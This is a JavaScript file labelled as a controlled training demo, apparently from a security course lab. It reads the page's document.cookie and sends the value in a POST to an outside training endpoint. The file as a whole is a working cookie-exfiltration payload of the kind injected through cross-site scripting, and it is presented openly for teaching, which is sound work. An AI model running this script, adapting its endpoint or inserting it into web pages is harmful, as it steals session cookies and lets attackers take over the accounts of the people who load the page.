/**
 * D1/S2 controlled training demo.
 *
 * This script deliberately reads document.cookie from the page that loads it
 * and sends that visible string to the fixed D1/S2 training API. It is meant
 * to be read, discussed and loaded intentionally—not hidden or obfuscated.
 */
(() => {
  "use strict";

  const endpoint = "https://training.bad-sector.games/secu-5d/day1/s2/api.php";
  const marker = "d1s2-readable-cookie-demo";
  const visibleCookies = document.cookie || "";

  const body = new URLSearchParams({
    lab_marker: marker,
    cookie: visibleCookies,
  });

  fetch(endpoint, {
    method: "POST",
    mode: "cors",
    credentials: "omit",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    },
    body,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`D1/S2 API returned HTTP ${response.status}`);
      }
      return response.json();
    })
    .then(() => {
      const detail = visibleCookies
        ? "the JavaScript-readable demo cookies"
        : "the fact that no cookie was readable by JavaScript";
      console.info(`[D1/S2 training demo] Sent ${detail} to the controlled page.`);
    })
    .catch((error) => {
      console.warn("[D1/S2 training demo] The controlled POST failed.", error);
    });
})();
